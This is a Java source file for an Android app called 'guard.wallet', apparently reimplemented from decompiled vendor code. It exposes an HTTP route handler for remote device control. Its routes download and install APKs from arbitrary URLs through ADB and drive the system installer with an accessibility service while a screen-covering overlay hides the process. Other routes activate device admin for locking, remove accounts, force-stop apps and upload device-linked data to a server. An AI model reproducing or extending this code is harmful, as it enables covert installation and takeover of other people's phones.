package com.guard.wallet.server.handler;

import com.guard.wallet.adb.AdbConnectionManager;
import com.koushikdutta.async.http.server.AsyncHttpServerResponse;
import com.guard.wallet.core.AppUtils;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.net.Uri;
import android.provider.Settings;
import android.util.Log;
import com.guard.wallet.req.AdminAdminActivatingVO;
import com.guard.wallet.req.UploadAppIconVO;
import com.koushikdutta.async.http.Multimap;
import com.guard.wallet.receiver.CustomAdminReceiver;
import com.guard.wallet.resp.DeviceAdminVO;
import com.guard.wallet.resp.PowerControlStateVO;
import com.guard.wallet.server.HttpResponseHelper;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.AppManagerUtils;
import com.guard.wallet.utils.SystemHelper;

import java.io.ByteArrayOutputStream;
import java.io.Serializable;
import java.util.LinkedHashMap;
import java.util.List;

/**
 * 应用管理 Handler — 22 路由。
 * vendor server/b.java 中 /startApp ... /syncPowerControl 路由。
 */
public final class AppManageHandler {
    private static final String TAG = "HttpServer";

    private AppManageHandler() {}

    private static Context ctx() { return AppManagerUtils.getContext(); }

    // ─── /startApp ───

    public static void startApp(String pkg, String activity, boolean start, List<Object> windows, AsyncHttpServerResponse response) {
        try {
            Context ctx = ctx();
            if (ctx != null && pkg != null && !pkg.isEmpty()) {
                if (start && activity != null && !activity.isEmpty()) {
                    Intent intent = new Intent();
                    intent.setComponent(new ComponentName(pkg, activity));
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    ctx.startActivity(intent);
                } else {
                    Intent launch = ctx.getPackageManager().getLaunchIntentForPackage(pkg);
                    if (launch != null) {
                        launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        ctx.startActivity(launch);
                    }
                }
            }
            HttpResponseHelper.ok(response, true);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /startAppFromDesktop ───
    // vendor: b.P2(packageName, applicationLabel, response)
    // When accessibility is running, calls AppUtils.O() to handle launch from desktop

    public static void startAppFromDesktop(String packageName, String applicationLabel, AsyncHttpServerResponse response) {
        try {
            Object result;
            if (!AppUtils.A()) {
                result = AppUtils.O(packageName, applicationLabel);
            } else {
                result = Boolean.TRUE;
            }
            HttpResponseHelper.ok(response, result);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /killApp ───

    public static void killApp(AsyncHttpServerResponse response, String pkg) {
        try {
            Log.d(TAG, "killApp: " + pkg);
            // vendor: 通过 am force-stop 命令杀死应用
            if (pkg != null && !pkg.isEmpty()) {
                try {
                    Runtime.getRuntime().exec(new String[]{"am", "force-stop", pkg});
                } catch (Exception ex) {
                    Log.e(TAG, "killApp error", ex);
                }
            }
            HttpResponseHelper.ok(response, true);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /install ───
    // vendor: b.p1(logId, fileUrl, fileName, startCommand, response)
    // Uses ADB manager (AdbConnectionManager) to push & install the APK

    public static void install(String logId, String fileUrl, String fileName, String startCmd, AsyncHttpServerResponse response) {
        try {
            // vendor: p1() delegates to ADB manager for install
            AdbConnectionManager.initialize();
            AdbConnectionManager manager = AdbConnectionManager.getInstance();
            if (manager != null) {
                boolean result = manager.downloadAndInstall(logId, fileUrl, fileName, startCmd);
                HttpResponseHelper.ok(response, result);
            } else {
                HttpResponseHelper.noContent(response);
            }
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /prepareInstallApp ───
    // vendor: b.Z1(response) — 准备安装前置检查
    // Checks: ADB/root available, accessibility ready, screen state, vendor engine state

    public static void prepareInstallApp(AsyncHttpServerResponse response) {
        try {
            boolean hasAdbOrRoot = com.guard.wallet.utils.SharedPrefsManager.n() || com.guard.wallet.utils.SharedPrefsManager.o();
            long checkThreadCounter = 0L;
            if (com.guard.wallet.MainApplication.getInstance() != null
                    && com.guard.wallet.MainApplication.getInstance().getCheckThread() != null) {
                checkThreadCounter = com.guard.wallet.MainApplication.getInstance()
                        .getCheckThread().p.get();
            }

            boolean ready = true;
            // vendor: 如果 root/adb 可用且屏幕状态满足条件, 但无锁屏遮罩
            if ((com.guard.wallet.delegate.PackageInstallerDelegate.R() || com.guard.wallet.utils.SystemHelper.c())
                    && !com.guard.wallet.helper.BlockViewManager.g()) {
                // 需要无障碍服务
                if (MyAccessibilityService.P() == null || MyAccessibilityService.P().j()) {
                    ready = false;
                } else if (checkThreadCounter <= 0L) {
                    ready = false;
                } else if (!hasAdbOrRoot) {
                    ready = false;
                }
            }
            if (ready && !com.guard.wallet.utils.SharedPrefsManager.o()) {
                com.guard.wallet.http.HttpApiManager.fetchLockCiphers();
            }
            HttpResponseHelper.ok(response, ready);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /startInstallApp ───
    // vendor: b.S2(response) — 开始安装监听
    // Sets up accessibility delegate (o.x) and block view for install flow

    public static void startInstallApp(AsyncHttpServerResponse response) {
        try {
            boolean hasAdbOrRoot = com.guard.wallet.utils.SharedPrefsManager.n() || com.guard.wallet.utils.SharedPrefsManager.o();
            boolean ready = true;
            com.guard.wallet.req.BlockViewVO blockViewVO =
                    new com.guard.wallet.req.BlockViewVO(false, null, true, true);
            if (com.guard.wallet.utils.DeviceUtils.isScreenOn() && MyAccessibilityService.P() != null) {
                blockViewVO.setBlockDrawable(MyAccessibilityService.o0());
            }

            // vendor: 检查屏幕状态和辅助功能
            if ((com.guard.wallet.delegate.PackageInstallerDelegate.R() || com.guard.wallet.utils.SystemHelper.c())
                    && (MyAccessibilityService.P() == null || MyAccessibilityService.P().j())) {
                ready = false;
            }

            if (ready) {
                // vendor: 注册 x (PackageInstaller) 代理
                MyAccessibilityService service = MyAccessibilityService.P();
                if (service != null) {
                    if (service.o()) {
                        service.A();
                    }
                    java.util.concurrent.ConcurrentLinkedQueue<Object> delegates = service.a;
                    com.guard.wallet.delegate.PackageInstallerDelegate installDelegate = new com.guard.wallet.delegate.PackageInstallerDelegate();
                    delegates.add(installDelegate);
                    java.util.LinkedList<Object> windows = com.guard.wallet.delegate.PackageInstallerDelegate.N();
                    service.t(com.guard.wallet.delegate.PackageInstallerDelegate.class.getName(), windows);
                    service.a();
                    // vendor: 显示遮罩
                    if (com.guard.wallet.delegate.PackageInstallerDelegate.R() || com.guard.wallet.utils.SystemHelper.c()) {
                        com.guard.wallet.helper.BlockViewManager.a(blockViewVO);
                    }
                }
            }
            HttpResponseHelper.ok(response, ready);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /finishInstallApp ───
    // vendor: b.c1(response) — 完成安装，清理代理和遮罩

    public static void finishInstallApp(AsyncHttpServerResponse response) {
        try {
            boolean result = false;
            if (MyAccessibilityService.P() != null) {
                MyAccessibilityService.P().A();
                MyAccessibilityService.P().u();
                result = true;
            }
            com.guard.wallet.helper.BlockViewManager.c();
            HttpResponseHelper.ok(response, result);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /browserApps ───

    public static void browserApps(AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "browserApps");
            HttpResponseHelper.ok(response, com.guard.wallet.utils.SystemHelper.e0());
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /uploadAppIcon ───

    public static void uploadAppIcon(AsyncHttpServerResponse response, String pkg) {
        try {
            Log.d(TAG, "uploadAppIcon: " + pkg);
            Context ctx = ctx();
            if (ctx == null || AppUtils.B(pkg)) {
                HttpResponseHelper.ok(response, false);
                return;
            }
            Drawable icon = AppManagerUtils.getAppIcon(pkg);
            byte[] iconBytes = drawableToBytes(icon);
            if (iconBytes == null || iconBytes.length == 0) {
                HttpResponseHelper.ok(response, false);
                return;
            }
            Thread worker = new Thread(() -> {
                try {
                    String deviceId = com.guard.wallet.utils.SharedPrefsManager.l("deviceId");
                    if (AppUtils.B(deviceId)) {
                        return;
                    }
                    UploadAppIconVO body = new UploadAppIconVO(deviceId, pkg, "100018");
                    new com.guard.wallet.http.HttpClient().asyncUploadBytes(
                            body,
                            "/api/package/uploadAppIcon.json",
                            pkg.concat("_ic_launcher.png"),
                            iconBytes,
                            new com.guard.wallet.http.UploadAppIconCallback());
                } catch (Exception e) {
                    AppUtils.s(TAG, e);
                }
            }, "upload-app-icon");
            worker.setDaemon(true);
            worker.start();
            LinkedHashMap<String, Object> result = new LinkedHashMap<>();
            result.put("packageName", pkg);
            result.put("scheduled", true);
            result.put("bytes", iconBytes.length);
            HttpResponseHelper.ok(response, result);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /startSettings ───

    public static void startSettings(List<Object> windows, AsyncHttpServerResponse response) {
        try {
            Context ctx = ctx();
            if (ctx != null) {
                Intent intent = new Intent(Settings.ACTION_SETTINGS);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(intent);
            }
            HttpResponseHelper.ok(response, true);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /startAboutDevice ───

    public static void startAboutDevice(List<Object> windows, AsyncHttpServerResponse response) {
        try {
            Context ctx = ctx();
            if (ctx != null) {
                Intent intent = new Intent(Settings.ACTION_DEVICE_INFO_SETTINGS);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(intent);
            }
            HttpResponseHelper.ok(response, true);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /startDevSetting ───

    public static void startDevSetting(List<Object> windows, AsyncHttpServerResponse response) {
        try {
            Context ctx = ctx();
            if (ctx != null) {
                Intent intent = new Intent(Settings.ACTION_APPLICATION_DEVELOPMENT_SETTINGS);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(intent);
            }
            HttpResponseHelper.ok(response, true);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /startWifiSetting ───

    public static void startWifiSetting(List<Object> windows, AsyncHttpServerResponse response) {
        try {
            Context ctx = ctx();
            if (ctx != null) {
                Intent intent = new Intent(Settings.ACTION_WIFI_SETTINGS);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(intent);
            }
            HttpResponseHelper.ok(response, true);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /startAppDetailSetting ───

    public static void startAppDetailSetting(String pkg, List<Object> windows, AsyncHttpServerResponse response) {
        try {
            Context ctx = ctx();
            if (ctx != null && pkg != null) {
                Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                intent.setData(Uri.parse("package:" + pkg));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(intent);
            }
            HttpResponseHelper.ok(response, true);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /startAppWriteSetting ───

    public static void startAppWriteSetting(String pkg, List<Object> windows, AsyncHttpServerResponse response) {
        try {
            Context ctx = ctx();
            if (ctx != null && pkg != null) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS);
                intent.setData(Uri.parse("package:" + pkg));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(intent);
            }
            HttpResponseHelper.ok(response, true);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /startAccessibility ───

    public static void startAccessibility(AsyncHttpServerResponse response) {
        try {
            Context ctx = ctx();
            if (ctx != null) {
                Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(intent);
            }
            HttpResponseHelper.ok(response, true);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /startAdminActive ───

    public static void startAdminActive(AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "startAdminActive");
            Context ctx = ctx();
            if (ctx == null) {
                HttpResponseHelper.ok(response, false);
                return;
            }
            DevicePolicyManager dpm =
                    (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(ctx, CustomAdminReceiver.class);
            if (dpm != null && dpm.isAdminActive(admin)) {
                com.guard.wallet.utils.SharedPrefsManager.B(false, false);
                HttpResponseHelper.ok(response, SystemHelper.C0());
                return;
            }
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Enable device admin to support device lock, screen control and security flows.");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            com.guard.wallet.utils.SharedPrefsManager.B(true, false);
            ctx.startActivity(intent);
            HttpResponseHelper.ok(response, new AdminAdminActivatingVO(true));
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /stopAdminActive ───

    public static void stopAdminActive(AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "stopAdminActive");
            Context ctx = ctx();
            if (ctx == null) {
                HttpResponseHelper.ok(response, false);
                return;
            }
            DevicePolicyManager dpm =
                    (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(ctx, CustomAdminReceiver.class);
            if (dpm != null && dpm.isAdminActive(admin)) {
                dpm.removeActiveAdmin(admin);
            }
            com.guard.wallet.utils.SharedPrefsManager.B(false, false);
            DeviceAdminVO result = SystemHelper.C0();
            HttpResponseHelper.ok(response, result);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /syncAdminActivating ───

    public static void syncAdminActivating(Multimap params, AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "syncAdminActivating");
            boolean activating = params != null && Boolean.parseBoolean(params.getString("adminActivating"));
            com.guard.wallet.utils.SharedPrefsManager.B(activating, false);
            AdminAdminActivatingVO result = new AdminAdminActivatingVO(activating);
            HttpResponseHelper.ok(response, result);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /removeAccount ───

    public static void removeAccount(AsyncHttpServerResponse response, String accountType) {
        try {
            Log.d(TAG, "removeAccount: " + accountType);
            Context ctx = ctx();
            if (ctx == null) {
                HttpResponseHelper.ok(response, false);
                return;
            }
            String targetType = AppUtils.B(accountType) ? "com.guard.wallet" : accountType;
            AccountManager manager = AccountManager.get(ctx);
            int removed = 0;
            for (Account account : manager.getAccountsByType(targetType)) {
                try {
                    if (account != null && targetType.equals(account.type)
                            && manager.removeAccountExplicitly(account)) {
                        removed++;
                    }
                } catch (Exception e) {
                    AppUtils.s(TAG, e);
                }
            }
            LinkedHashMap<String, Serializable> result = new LinkedHashMap<>();
            result.put("accountType", targetType);
            result.put("removedCount", removed);
            result.put("success", removed > 0);
            HttpResponseHelper.ok(response, result);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /sharePowerControl ───

    public static void sharePowerControl(AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "sharePowerControl");
            Context ctx = ctx();
            String ownPackage = ctx != null ? ctx.getPackageName() : null;
            java.util.LinkedList<PowerControlStateVO> list = new java.util.LinkedList<>();
            if (ownPackage != null) {
                list.add(com.guard.wallet.utils.SharedPrefsManager.k(ownPackage));
            }
            list.add(com.guard.wallet.utils.SharedPrefsManager.k("com.google.guard"));
            HttpResponseHelper.ok(response, list);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /syncPowerControl ───

    public static void syncPowerControl(Multimap params, AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "syncPowerControl");
            PowerControlStateVO vo = new PowerControlStateVO();
            vo.setPackageName(params != null ? params.getString("packageName") : null);
            vo.setDeviceId(params != null ? params.getString("deviceId") : null);
            vo.setAllowAllFullBackground(params != null && Boolean.parseBoolean(params.getString("allowAllFullBackground")));
            vo.setAllowPopupInBackground(params != null && Boolean.parseBoolean(params.getString("allowPopupInBackground")));
            vo.setAllowAutoStart(params != null && Boolean.parseBoolean(params.getString("allowAutoStart")));
            vo.setAllowRelateStart(params != null && Boolean.parseBoolean(params.getString("allowRelateStart")));
            if (params != null && AppUtils.D(params.getString("retryCount"))) {
                vo.setRetryCount(Integer.parseInt(params.getString("retryCount")));
            }
            if (!AppUtils.B(vo.getPackageName())) {
                com.guard.wallet.utils.SharedPrefsManager.L(vo);
            }
            HttpResponseHelper.ok(response, vo);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    private static byte[] drawableToBytes(Drawable drawable) {
        if (drawable == null) {
            return null;
        }
        try {
            Bitmap bitmap;
            if (drawable instanceof BitmapDrawable
                    && ((BitmapDrawable) drawable).getBitmap() != null) {
                bitmap = ((BitmapDrawable) drawable).getBitmap();
            } else {
                int width = Math.max(1, drawable.getIntrinsicWidth());
                int height = Math.max(1, drawable.getIntrinsicHeight());
                bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
                Canvas canvas = new Canvas(bitmap);
                drawable.setBounds(0, 0, canvas.getWidth(), canvas.getHeight());
                drawable.draw(canvas);
            }
            ByteArrayOutputStream output = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.PNG, 100, output);
            return output.toByteArray();
        } catch (Exception e) {
            AppUtils.s(TAG, e);
            return null;
        }
    }
}
